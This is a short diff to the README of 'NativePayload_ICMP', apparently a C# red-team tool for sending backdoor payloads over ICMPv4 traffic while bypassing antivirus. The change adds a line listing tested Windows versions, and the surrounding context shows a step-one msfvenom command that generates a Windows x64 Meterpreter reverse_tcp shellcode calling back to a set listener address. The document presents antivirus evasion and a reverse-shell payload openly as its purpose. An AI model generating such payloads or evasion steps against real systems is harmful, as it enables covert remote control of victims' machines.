@@ -3,6 +3,8 @@ C# code Published by Damon Mohammadbagher
 
 NativePayload_ICMP : transfer Backdoor Payloads by ICMPv4 Traffic and bypassing Anti-Viruses
 
+Tested : Win7 SP1 and Win 2008 R2
+
 step by step:
 
 example step1 msfvenom --arch x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 -f c > payload.txt
